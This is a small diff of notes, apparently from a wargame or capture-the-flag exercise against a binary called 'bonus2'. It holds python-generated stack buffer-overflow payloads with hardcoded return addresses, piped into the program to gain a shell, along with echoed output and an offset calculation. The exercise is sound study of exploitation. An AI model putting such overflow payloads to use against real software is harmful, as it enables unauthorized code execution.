@@ -7,11 +7,9 @@ r $(python -c 'print "AAAA" + "\xbf\xff\xfb\xc7"[::-1] + "A"*32') $(python -c 'p
 r $(python -c 'print "AAAA" + "\xbf\xff\xfd\x58"[::-1] + "A"*32') $(python -c 'print "B"*26')
 
 
-($(python -c 'print "AAAA" + "\xbf\xff\xfb\xc7"[::-1] + "B"*32') ; $(python -c 'print "B"*26') ; cat ) | ./bonus2
+($(python -c 'print "AAAA" + "\xbf\xff\xfb\xc7"[::-1] + "Z"*32') ; $(python -c 'print "B"*26') ; cat ) | ./bonus2
 
-Hello AAAA����BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
-
-Hello AAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB
+Hello AAAA����ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZBBBBBBBBBBBBBBBBBBBBBBBBBB
 26 + 32 + 8
 
 
